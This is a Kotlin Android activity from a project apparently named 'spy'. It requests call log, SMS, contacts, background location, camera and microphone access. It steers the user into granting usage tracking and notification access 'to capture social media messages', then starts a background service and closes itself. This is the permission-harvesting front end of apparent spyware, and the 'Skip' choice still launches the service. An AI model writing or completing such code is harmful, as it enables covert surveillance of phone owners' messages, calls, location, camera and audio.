package com.gauravhanna.spy

import android.Manifest
import android.app.AppOpsManager
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "MainActivity"
        private const val PERMISSION_REQUEST_CODE = 100
        private const val BACKGROUND_LOCATION_REQUEST_CODE = 101
        private const val POST_NOTIFICATIONS_REQUEST_CODE = 102
    }

    private val requiredPermissions = listOf(
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO
    )

    private var isServiceStarted = false
    private var pendingSpecialDialog: AlertDialog? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (hasAllDangerousPermissions()) {
            checkSpecialPermissions()
        } else {
            ActivityCompat.requestPermissions(
                this,
                requiredPermissions.toTypedArray(),
                PERMISSION_REQUEST_CODE
            )
        }
    }

    private fun hasAllDangerousPermissions(): Boolean {
        return requiredPermissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        when (requestCode) {
            PERMISSION_REQUEST_CODE -> {
                if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                    checkSpecialPermissions()
                } else {
                    showPermissionExplanationDialog()
                }
            }
            BACKGROUND_LOCATION_REQUEST_CODE -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    Log.d(TAG, "Background location granted")
                }
                checkSpecialPermissions()
            }
            POST_NOTIFICATIONS_REQUEST_CODE -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    Log.d(TAG, "POST_NOTIFICATIONS granted")
                }
                checkSpecialPermissions()
            }
        }
    }

    private fun checkSpecialPermissions() {
        var allSpecialGranted = true

        // Usage Stats
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val appOps = getSystemService(AppOpsManager::class.java)
            val usageAccess = appOps.unsafeCheckOpNoThrow(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(),
                packageName
            ) == AppOpsManager.MODE_ALLOWED
            if (!usageAccess) {
                allSpecialGranted = false
                showSpecialPermissionDialog(
                    "Usage Access Required",
                    "Please enable Usage Access to track app usage.",
                    Settings.ACTION_USAGE_ACCESS_SETTINGS
                )
            }
        }

        // Notification Access
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
            val notificationAccess = try {
                val enabledListeners = Settings.Secure.getString(
                    contentResolver,
                    "enabled_notification_listeners"
                )
                enabledListeners?.contains(packageName) == true
            } catch (e: Exception) { false }
            if (!notificationAccess) {
                allSpecialGranted = false
                showSpecialPermissionDialog(
                    "Notification Access Required",
                    "Please enable Notification Access to capture social media messages.",
                    Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS
                )
            }
        }

        // Background Location (Android 10+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val backgroundLocationGranted = ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_BACKGROUND_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
            if (!backgroundLocationGranted) {
                allSpecialGranted = false
                ActivityCompat.requestPermissions(
                    this,
                    arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),
                    BACKGROUND_LOCATION_REQUEST_CODE
                )
                return
            }
        }

        // POST_NOTIFICATIONS (Android 13+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            val postNotificationsGranted = ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.POST_NOTIFICATIONS
            ) == PackageManager.PERMISSION_GRANTED
            if (!postNotificationsGranted) {
                allSpecialGranted = false
                ActivityCompat.requestPermissions(
                    this,
                    arrayOf(Manifest.permission.POST_NOTIFICATIONS),
                    POST_NOTIFICATIONS_REQUEST_CODE
                )
                return
            }
        }

        if (allSpecialGranted) {
            startBackgroundService()
        }
    }

    private fun showSpecialPermissionDialog(title: String, message: String, settingsAction: String) {
        pendingSpecialDialog?.dismiss()
        pendingSpecialDialog = AlertDialog.Builder(this)
            .setTitle(title)
            .setMessage(message)
            .setPositiveButton("Open Settings") { _, _ ->
                startActivity(Intent(settingsAction))
                startBackgroundService()
            }
            .setNegativeButton("Skip (limited functionality)") { _, _ ->
                startBackgroundService()
            }
            .setOnDismissListener {
                pendingSpecialDialog = null
                if (!isServiceStarted) startBackgroundService()
            }
            .show()
    }

    private fun showPermissionExplanationDialog() {
        AlertDialog.Builder(this)
            .setTitle("Permissions Required")
            .setMessage("This app needs call logs, SMS, contacts, location, camera, and microphone permissions to work properly.")
            .setPositiveButton("Open Settings") { _, _ ->
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
                startBackgroundService()
            }
            .setNegativeButton("Exit") { _, _ ->
                finishAffinity()
            }
            .setCancelable(false)
            .show()
    }

    private fun startBackgroundService() {
        if (isServiceStarted) return
        isServiceStarted = true
        Log.d(TAG, "Starting BackgroundService")
        val intent = Intent(this, BackgroundService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
        finish()
    }
}